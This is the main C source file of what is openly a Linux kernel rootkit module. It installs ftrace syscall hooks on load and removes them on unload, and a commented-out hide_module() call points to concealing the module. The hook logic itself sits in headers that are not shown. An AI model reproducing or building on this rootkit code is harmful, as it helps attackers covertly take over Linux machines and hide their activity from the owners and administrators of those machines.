#include <linux/module.h>
#include <linux/kernel.h>

#include "stdlib.h"
#include "rootkit.h"
#include "ftrace_helper.h"
#include "hooks.h"

MODULE_LICENSE("GPL");

static int rk_init(void) {
	int err;
	
	err = fh_install_hooks(syscall_hooks, ARRAY_SIZE(syscall_hooks));
	if (err){
		return err;
	}

	//hide_module();

	//rk_info("module loaded\n");

	return 0;
}

static void rk_exit(void) {
	fh_remove_hooks(syscall_hooks, ARRAY_SIZE(syscall_hooks));

	//rk_info("module unloaded\n");
}

module_init(rk_init);
module_exit(rk_exit);
